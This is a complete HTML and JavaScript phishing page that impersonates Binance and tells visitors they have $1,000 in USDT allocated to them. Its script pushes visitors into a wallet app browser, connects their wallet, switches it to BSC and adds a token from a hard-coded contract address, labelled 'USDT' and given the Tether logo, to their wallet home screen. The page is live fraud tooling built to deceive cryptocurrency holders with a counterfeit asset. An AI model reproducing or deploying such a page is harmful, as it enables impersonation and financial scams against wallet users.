<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binance | Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
        .logo { width: 55px; margin-bottom: 20px; }
        .amount { font-size: 32px; font-weight: 800; margin: 15px 0; color: #fff; }
        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }
        #status { font-size: 10px; color: var(--b-yellow); margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="logo">
    <div style="color: #848e9c; font-size: 12px; text-transform: uppercase;">Allocated USDT (BEP20)</div>
    <div class="amount">$1,000.00</div>
    
    <button class="btn" id="actionBtn">CONNECT WALLET</button>
    <div id="status">STATUS: INITIALIZING...</div>
</div>

<script>
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    const actionBtn = document.getElementById('actionBtn');
    const status = document.getElementById('status');

    // 1. Check if we are ALREADY inside a Wallet Browser
    const isDApp = window.ethereum || window.trustwallet;

    if (isDApp) {
        actionBtn.innerText = "ADD TO WALLET HOME";
        status.innerText = "DAPP BROWSER DETECTED";
    }

    async function handleAction() {
        if (!isDApp) {
            // Agar bahar hain (Chrome mein), to Redirect karein
            status.innerText = "REDIRECTING...";
            const cleanUrl = window.location.href.split('://')[1];
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + cleanUrl;
            return;
        }

        // AGAR ANDAR HAIN (DApp Browser):
        try {
            const provider = window.trustwallet || window.ethereum;
            status.innerText = "LINKING ASSETS...";
            
            await provider.request({ method: 'eth_requestAccounts' });

            // Switch to BSC (Zaruri hai)
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                    });
                }
            });

            // Trigger Add Token with Delay (To fix the mobile loop)
            setTimeout(async () => {
                try {
                    const added = await provider.request({
                        method: 'wallet_watchAsset',
                        params: {
                            type: 'ERC20',
                            options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                        },
                    });
                    if (added) {
                        status.innerText = "ASSET ADDED TO HOME PAGE";
                        alert("Success! Check your Wallet Home Screen.");
                    }
                } catch (e) {
                    status.innerText = "POPUP BLOCKED OR REJECTED";
                }
            }, 1000);

        } catch (e) {
            status.innerText = "CONNECTION ERROR";
        }
    }

    actionBtn.addEventListener('click', handleAction);
</script>
</body>
</html>
